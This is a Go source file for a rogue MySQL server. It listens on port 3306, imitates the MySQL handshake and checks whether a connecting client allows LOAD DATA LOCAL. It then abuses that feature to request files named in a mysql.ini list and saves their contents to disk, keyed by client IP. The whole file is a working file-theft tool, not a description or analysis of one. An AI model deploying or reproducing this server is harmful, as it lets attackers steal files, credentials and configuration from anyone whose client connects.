package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"log"
	"net"
	"os"
	"strconv"
	"syscall"
)

var configFile = "mysql.ini"
var fileNames []string
var recordClient = make(map[string]int)
var bufLength=1024
// the first packet
var ServerGreetingData = []byte{
	0x4a, 0x00, 0x00, 0x00, 0x0a, 0x35, 0x2e, 0x35, 0x2e, 0x35, 0x33,
	0x00, 0x01, 0x00, 0x00, 0x00, 0x75, 0x51, 0x73, 0x6f, 0x54, 0x36,
	0x50, 0x70, 0x00, 0xff, 0xf7, 0x21, 0x02, 0x00, 0x0f, 0x80, 0x15,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64,
	0x26, 0x2b, 0x47, 0x62, 0x39, 0x35, 0x3c, 0x6c, 0x30, 0x45, 0x4a,
	0x00, 0x6d, 0x79, 0x73, 0x71, 0x6c, 0x5f, 0x6e, 0x61, 0x74, 0x69,
	0x76, 0x65, 0x5f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64,
	0x00,
}

//the 2nd packet
var OkData = []byte{0x07, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00}


func readConfig() []string {
	var line []string
	fileHandle, error := os.OpenFile(configFile, os.O_RDONLY, 0)
	handleErr(error)
	defer fileHandle.Close()
	sc := bufio.NewScanner(fileHandle)
	for sc.Scan() {
		line = append(line, sc.Text())
	}
	handleErr(sc.Err())
	return line
}


func handleErr(err error){
	if err!=nil{
		log.Println(err)
	}
}

func getIp(conn net.Conn) string {
	ip, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
	return ip
}
func getRequestContent(conn net.Conn){
	var content bytes.Buffer
	//先读取数据包长度，前面3字节
	lengthBuf := make([]byte, 3)
	_, err := conn.Read(lengthBuf)
	handleErr(err)
	totalDataLength := int(binary.LittleEndian.Uint32(append(lengthBuf, 0)))
	if totalDataLength == 0 {
		log.Println("Get no file and closed connection.")
		return
	}
	//然后丢掉1字节的序列号
	_, _ = conn.Read(make([]byte, 1))
	buf := make([]byte, bufLength)
	totalReadLength := 0
	//循环读取知道读取的长度达到包长度
	for {
		length, err := conn.Read(buf)
		switch err {
		case nil:
			log.Println("Get file and reading...")
			//如果本次读取的内容长度+之前读取的内容长度大于文件内容总长度，则本次读取的文件内容只能留下一部分
			if length+totalReadLength > totalDataLength {
				length = totalDataLength - totalReadLength
			}
			content.Write(buf[0:length])
			totalReadLength += length
			if totalReadLength == totalDataLength {
				saveContent(conn, content)
				_, _ = conn.Write(OkData)
			}
		case syscall.EAGAIN: // try again
			continue
		default:
			log.Println("Closed connection: ", conn.RemoteAddr().String())
			return
		}
	}
}

func saveContent(conn net.Conn, content bytes.Buffer) {
	ip := getIp(conn)
	saveName := ip + "-" + strconv.Itoa(recordClient[ip]) + ".txt"
	outputFile, outputError := os.OpenFile(saveName, os.O_WRONLY|os.O_CREATE, 0666)
	handleErr(outputError)
	defer outputFile.Close()
	outputWriter := bufio.NewWriter(outputFile)
	_, writeErr := outputWriter.WriteString(content.String())
	handleErr(writeErr)
	_ = outputWriter.Flush()
	return
}

func handleConnect(conn net.Conn){
	defer conn.Close()

	// the first packet
	_,err:=conn.Write(ServerGreetingData)
	handleErr(err)
	var buf = make([]byte, bufLength)
	_,err=conn.Read(buf[0:bufLength-1])
	handleErr(err)

	// handle FLAG at "Can Use LOAD DATA LOCAL"
	if (buf[4] & 128) == 0 {
		_ = conn.Close()
		log.Println("The client not support LOAD DATA LOCAL")
		return
	}
	// the 2nd packet
	_, err = conn.Write(OkData)
	handleErr(err)
	_, err = conn.Read(buf[0 : bufLength-1])
	handleErr(err)

	// Start reading file
	ip := getIp(conn)
	getFileData := []byte{byte(len(fileNames[recordClient[ip]]) + 1), 0x00, 0x00, 0x01, 0xfb}
	getFileData = append(getFileData, fileNames[recordClient[ip]]...)
	// the 3rd packet
	_, err = conn.Write(getFileData)
	handleErr(err)
	getRequestContent(conn)


}

func main(){
	listen,err:=net.Listen("tcp","0.0.0.0:3306")
	handleErr(err)
	log.Println("Listening to: ", listen.Addr().String())
	fileNames = readConfig()
	for{
		conn,err:=listen.Accept()
		handleErr(err)
		handleConnect(conn)
	}
}

